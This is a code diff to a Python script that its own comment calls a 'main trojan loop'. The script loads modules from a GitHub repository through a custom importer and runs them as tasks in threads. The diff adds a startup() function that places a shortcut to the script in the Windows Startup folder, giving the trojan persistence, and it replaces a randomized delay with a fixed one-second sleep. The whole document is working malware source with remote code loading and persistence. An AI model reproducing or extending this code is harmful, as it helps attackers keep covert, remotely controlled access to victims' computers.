@@ -7,6 +7,9 @@ import random
 import threading
 import Queue
 import os
+import win32console
+import winshell
+import win32gui
 
 from github3 import login
 
@@ -80,6 +83,19 @@ class GitImporter(object):
         return module
 
 # main trojan loop
+
+
+def startup():
+    if name+".lnk" not in os.listdir(winshell.startup()):
+        link_loc = os.path.join(winshell.startup(),name+".lnk")
+        sc = winshell.shortcut()
+        sc.path = os.path.realpath(sys.argv[0])
+        sc.write(link_loc)
+
+
+
+
+
 sys.meta_path = [GitImporter()]
 while True:
     if task_queue.empty():
@@ -87,5 +103,5 @@ while True:
         for task in config:
             t = threading.Thread(target=module_runner,args=(task['module'],))
             t.start()
-            time.sleep(random.randint(1,10))
+            time.sleep(1)
     
